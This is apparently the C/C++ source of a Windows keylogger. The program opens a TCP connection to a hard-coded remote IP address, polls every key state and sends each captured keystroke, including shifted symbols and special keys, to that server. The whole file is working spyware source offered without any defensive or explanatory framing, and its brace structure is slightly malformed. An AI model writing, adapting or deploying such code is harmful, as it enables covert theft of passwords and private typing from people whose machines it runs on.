#include <stdio.h>
#include <stdlib.h>
//#include <sys/types.h>
//#include <sys/socket.h>
//#include <netinet/in.h>
#include <unistd.h>
//#include <arpa/inet.h>
#include <winsock.h>

//keylogger
#include <windows.h>
#include <winuser.h>
#include <string.h>

using namespace std;

//keylogger
void StartLogging(int);

char server_response[256];
char client_message[256];

int main() {

    // create a socket
    int network_socket, iResult;
    bool keepAlive = true;
    WSADATA wsaData;

    // initialize winsock
    iResult = WSAStartup(MAKEWORD(2,2), &wsaData);
    if(iResult != 0) {
        printf("[+] WinSock failed to initialize!");
        return 1;
    }

    network_socket = socket(AF_INET, SOCK_STREAM, 0);

    //specify an address for the socket
    struct sockaddr_in server_address;
    server_address.sin_family = AF_INET;
    server_address.sin_port = htons(9002);
    server_address.sin_addr.s_addr = inet_addr("24.211.104.102");

    int connection_status = connect(network_socket, (struct sockaddr *) &server_address, sizeof(server_address));

    // check for error with the connection
    if(connection_status == -1) {
        printf("There was an error making a connection to the remote socket\n\n");
        keepAlive = false;
        exit(1);
    }

    printf("[+] Connected\n");

    // Stay connected to server until client exits or connection is lost
    while(keepAlive) {
        //keylogger
        StartLogging(network_socket);
    }
    // close the socket
    close(network_socket);
    
    return 0;
}

void StartLogging(int network_socket) {
    char c;
    int iResult;

    printf("[+] Keylogger running...");
    for(;;) {
        for(c=8; c<=222; c++) {
            if(GetAsyncKeyState(c) == -32767) {
            if(((c>64)&&(c<91))&&!(GetAsyncKeyState(0x10)) )
                {
                    c+=32;
                    iResult = send(network_socket, &c, sizeof(c), 0);
                    break;
                }
                else if((c>64)&&(c<91))
                {
                    
                    iResult = send(network_socket, &c, sizeof(c), 0);
                    break;
                }
                else {
                    
                    switch (c)
                    {
                        case 48:
                        {
                            if(GetAsyncKeyState(0x10))
                                iResult = send(network_socket, ")", sizeof(")"), 0);
                            else
                                iResult = send(network_socket, "0", sizeof("0"), 0);        
                        break;
                        
                        
                        
                        case 49:
                        {
                            if(GetAsyncKeyState(0x10))   
                                iResult = send(network_socket, "!", sizeof("!"), 0);
                            else
                                iResult = send(network_socket, "1", sizeof("1"), 0);    
                            }   
                        break;
                        
                        case 50:
                        {
                            if(GetAsyncKeyState(0x10))
                                
                                iResult = send(network_socket, "@", sizeof("@"), 0);
                            else
                                iResult = send(network_socket, "2", sizeof("2"), 0);    
                            
                            }
                        break;
                        case 51:
                        {
                            if(GetAsyncKeyState(0x10))
                                
                                iResult = send(network_socket, "#", sizeof("#"), 0);
                            else
                                iResult = send(network_socket, "3", sizeof("3"), 0);    
                            
                            
                            }   
                        break;  
                        case 52:
                        {
                            if(GetAsyncKeyState(0x10))
                                
                                iResult = send(network_socket, "$", sizeof("$"), 0);
                            else
                                iResult = send(network_socket, "4", sizeof("4"), 0);  
                            
                            
                            }   
                        break;  
                        case 53:
                        {
                            if(GetAsyncKeyState(0x10))
                                
                                iResult = send(network_socket, "%", sizeof("%"), 0);
                            else
                                iResult = send(network_socket, "5", sizeof("5"), 0);   
                            
                            
                            }   
                        break;
                        case 54:
                        {
                            if(GetAsyncKeyState(0x10))
                                
                                iResult = send(network_socket, "^", sizeof("^"), 0);
                            else
                                iResult = send(network_socket, "6", sizeof("6"), 0);    
                            
                            
                            }   
                        break;
                        case 55:
                        {
                            if(GetAsyncKeyState(0x10))
                                
                                iResult = send(network_socket, "&", sizeof("&"), 0);
                            else
                                iResult = send(network_socket, "7", sizeof("7"), 0);   
                            
                            
                            }   
                        break;
                        case 56:
                        {
                            if(GetAsyncKeyState(0x10))
                                
                                iResult = send(network_socket, "*", sizeof("*"), 0);
                            else
                                iResult = send(network_socket, "8", sizeof("8"), 0);    
                            
                            
                            }   
                        break;
                        case 57:
                        {
                            if(GetAsyncKeyState(0x10))
                                
                                iResult = send(network_socket, "(", sizeof("("), 0);
                            else
                                iResult = send(network_socket, "9", sizeof("9"), 0);   
                            
                            
                            }   
                        break;
                        
                        case VK_SPACE:
                            iResult = send(network_socket, " ", sizeof(" "), 0);
                            break;
                        case VK_RETURN:
                            iResult = send(network_socket, "\n", sizeof("\n"), 0);
                            break;  
                        case VK_TAB:
                            iResult = send(network_socket, "  ", sizeof("  "), 0);
                            break;
                        case VK_BACK:
                            iResult = send(network_socket, "<BKSPC>", sizeof("<BKSPC>"), 0);
                            break;
                        case VK_DELETE:
                            iResult = send(network_socket, "<Del>", sizeof("<Del>"), 0);
                            break;
                        
                        default:
                            iResult = send(network_socket, &c, sizeof(c), 0);
                    }  
                }
            }
            if(iResult <= 0) {
                printf("[+] Disconnected");
                exit(1);
            }
        }
    }
}}